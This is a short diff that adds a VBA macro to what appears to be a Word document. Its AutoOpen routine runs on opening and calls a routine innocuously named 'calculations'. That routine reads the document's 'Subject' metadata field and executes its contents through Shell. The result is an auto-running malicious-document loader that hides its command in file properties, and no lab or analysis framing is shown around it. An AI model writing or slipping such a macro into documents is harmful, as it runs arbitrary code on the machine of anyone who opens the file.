@@ -1,1 +1,13 @@
+Sub AutoOpen()
+If Application.Documents.Count >= 1 Then
+    calculations
+End If
+End Sub
 
+Sub calculations()
+    'obtain the value from the subject string in document metadata and run it
+   Dim strProgramName As String
+   Set doc = ActiveDocument
+    strProgramName = doc.BuiltInDocumentProperties("Subject").Value
+    Call Shell("""" & strProgramName & """", vbNormalFocus)
+End Sub
